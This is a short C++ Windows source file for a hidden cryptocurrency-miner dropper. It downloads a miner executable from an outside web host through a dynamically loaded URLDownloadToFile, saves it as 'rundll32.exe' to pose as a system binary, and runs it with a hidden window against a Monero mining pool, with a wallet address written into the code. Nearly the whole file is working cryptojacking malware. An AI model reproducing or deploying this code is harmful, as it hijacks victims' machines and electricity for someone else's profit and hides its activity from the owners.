#include "stdafx.h"
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <urlmon.h>

typedef HRESULT(WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
    LPCTSTR szURL,
    LPCTSTR szFileName,
    DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB);

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    return written;
}

std::string AppName;
BOOL CALLBACK block(HWND, LPARAM);

void runFile();
void downloadMiner();

void StartMiner()
{
    downloadMiner(); //**Downloads bitcoin-miner.exe**//

    runFile(); //**Runs bitcoin-miner.exe**// 
}

void runFile()
{
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcess("rundll32.exe", " -lowcpu 1 -dbg -1 -o stratum+tcp://mine.moneropool.com:3333 -u 448y9UUUynjgcV4mP4AXNjBJ9hb18Toi5A4eGZStWVTELAzQJUHWXQrGfiTECzwgFTLFfBm6sCpfJbzzKTM6Yq2QHCZ4FCy -p x", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return;
}

void downloadMiner()
{
    //Probably isn't the best method at all, but it's what I got to work without trouble
    lpURLDownloadToFile URLDownloadToFile;

    HMODULE hUrlmon = LoadLibrary("URLMON.DLL");

    URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(hUrlmon, "URLDownloadToFileA");

    URLDownloadToFile(0, "http://lynix.digitalpulsesoftware.com/NsCpuCNMiner32.exe", "rundll32.exe", 0, 0);

    return;
}